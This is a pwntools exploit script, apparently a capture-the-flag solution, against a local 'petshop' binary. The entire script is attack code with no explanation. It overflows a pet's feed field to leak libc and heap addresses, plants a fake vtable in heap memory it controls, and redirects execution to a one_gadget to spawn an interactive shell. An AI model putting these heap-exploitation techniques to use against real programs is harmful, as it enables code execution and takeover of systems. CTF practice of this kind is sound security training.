from pwn import *

def buy(index):
	s.send("1\n")
	s.recvuntil(":\n")
	s.send(str(index)+"\n")
	s.recvuntil(":\n")

def sell():
	s.send("2\n")
	s.recvuntil(":\n")

def sound(index):	
	s.send("3\n")
	s.recvuntil(":\n")
	s.send(str(index)+"\n")
	s.recvuntil(":\n")

def set(option, index, name, sound, feed):
	s.send("4\n")
	s.recvuntil(":\n")
	s.send(str(index)+"\n")
	if(option):
		s.recvuntil("name:\n")
		s.send(name+"\n")
		s.recvuntil("sound:\n")
		s.send(sound+"\n")
		s.recvuntil("feed:\n")
		s.send(feed)
	s.recvuntil(":\n")

def list(option=0):
	s.send("5\n")
	if(option==1):
		a=s.recv(1024)
		leak=a[0x5c-3:0x5c+3]
		leak=u64(leak+"\x00\x00")
		return leak
	if(option==2):
		a=s.recv(1024)
		leak=a[0x5a:0x60]
		leak=leak.split("\x00")[0]
		leak=u64(leak+"\x00"*(8-len(leak)))
		return leak
	else:
		s.recvuntil(":\n")

def set_person(person):
	s.send("6\n")
	s.recvuntil("?\n")
	s.send(str(person)+"\n")
	s.recvuntil(":\n")

s=process("./petshop")
s.recvuntil(":\n")
buy(3)
buy(2)
set_person("hihi")

#libc leak(0x604058)
set(1,1,"hello","hi","a"*11+"\x00"+p64(0x604058)+p64(6)+p64(6)+"\n")
libc_leak=list(1)
print(hex(libc_leak))
one_gadget=libc_leak-0x7ffff7b64210+0x7ffff74ba390-0x45390+0xf1147
print(hex(one_gadget))

#main_arena+88(libc): top_chunk(heap) -> heap leak
heap=libc_leak-0x7fae4bb5c210+0x7fae4b831b78
print(hex(heap))

#overwrite vtable as certain heap area which we can control
set(1,1,"yaho","yeye","a"*11+"\x00"+p64(heap)+p64(6)+p64(6)+"\n")
heap_leak=list(2)
heap_leak=heap_leak-0x1439f20+0x1439eb0
print(hex(heap_leak))

#using fake vtable to execute one_gadget
#constraint: [rsp+0x70]=NULL

set(1,1,"gazua","gazua","a"*12+p64(one_gadget)+"a"*32+p64(heap_leak)+"\n")
pause()
s.send("3\n")
s.recvuntil(":\n")
s.send("2\n")
	
s.interactive()
s.close()